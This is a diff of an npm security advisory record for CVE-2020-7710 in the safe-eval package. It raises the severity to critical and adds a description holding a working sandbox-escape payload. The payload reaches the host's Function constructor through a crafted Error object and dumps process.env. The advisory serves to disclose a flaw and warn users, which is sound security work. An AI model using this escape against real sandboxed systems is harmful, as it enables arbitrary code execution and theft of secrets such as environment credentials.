@@ -1,5 +1,5 @@
 {
-  "Severity": "HIGH",
+  "Severity": "CRITICAL",
   "UpdatedAt": "2020-08-25T21:20:23Z",
   "Package": {
     "Ecosystem": "NPM",
@@ -27,12 +27,12 @@
         "Value": "CVE-2020-7710"
       }
     ],
-    "Description": "This affects all versions of package safe-eval. It is possible for an attacker to run an arbitrary command on the host machine.",
+    "Description": "All versions of `safe-eval` are vulnerable to Sandbox Escape leading to Remote Code Execution. The package fails to restrict access to the main context through Error objects. This may allow attackers to execute arbitrary code in the system. \n\nEvaluating the payload \n```\n(function (){\n  var ex = new Error\n  ex.__proto__ = null\n  ex.stack = {\n    match: x =\u003e {\n      return x.constructor.constructor(\"throw process.env\")()\n    }\n  }\n  return ex\n})()\n``` \n\nprints the contents of `process.env`.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2020-08-25T23:40:53Z",
-    "Severity": "HIGH",
-    "Summary": "Sandbox Escape in safe-eval",
-    "UpdatedAt": "2020-08-25T23:40:53Z",
+    "Severity": "CRITICAL",
+    "Summary": "Sandbox Breakout / Arbitrary Code Execution in safe-eval",
+    "UpdatedAt": "2020-08-31T18:55:10Z",
     "WithdrawnAt": ""
   },
   "Versions": [
